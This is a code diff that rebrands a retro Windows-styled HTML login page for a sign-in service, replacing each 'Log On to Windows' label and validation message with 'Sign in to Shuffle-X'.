@@ -28,7 +28,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log On to Windows</title>
+    <title>Sign in to Shuffle-X</title>
     
     <link rel="shortcut icon" href="https://cdn.kawaiicdn.net/apps/unifiedsso/assets/favicon_2.ico" type="image/x-icon">
     
@@ -573,7 +573,7 @@
 <div class="login-container" id="main-login-container" style="display: none;">
     <div class="window login-window">
         <div class="title-bar">
-            <div class="title-bar-text">Log On to Windows</div>
+            <div class="title-bar-text">Sign in to Shuffle-X</div>
             <div class="title-bar-controls">
                 <button aria-label="Close" disabled></button>
             </div>
@@ -585,7 +585,7 @@
                      src="https://cdn.kawaiicdn.net/cdn/i/png/s_346b79a57743ff0b6aab345aa27072507a1320a9964fab015bea1357c39f8419324457b1e114c60c.png?sz=120" 
                      alt="Windows Logo"
                      onerror="this.style.display='none'">
-                <div class="welcome-text">Log On to Windows</div>
+                <div class="welcome-text">Sign in to Shuffle-X</div>
                 <div class="instruction-text">Enter your user name and password</div>
             </div>
             
@@ -950,19 +950,19 @@ const DomainLoginApp = {
         const domain = this.domainSelect.value;
         
         if (!username) {
-            this.showNotification('Log On to Windows', 'Please enter your user name.', 'warning');
+            this.showNotification('Sign in to Shuffle-X', 'Please enter your user name.', 'warning');
             this.usernameField.focus();
             return;
         }
         
         if (!password) {
-            this.showNotification('Log On to Windows', 'Please enter your password.', 'warning');
+            this.showNotification('Sign in to Shuffle-X', 'Please enter your password.', 'warning');
             this.passwordField.focus();
             return;
         }
         
         if (!domain) {
-            this.showNotification('Log On to Windows', 'Please select a network from the dropdown.', 'warning');
+            this.showNotification('Sign in to Shuffle-X', 'Please select a network from the dropdown.', 'warning');
             this.domainSelect.focus();
             return;
         }
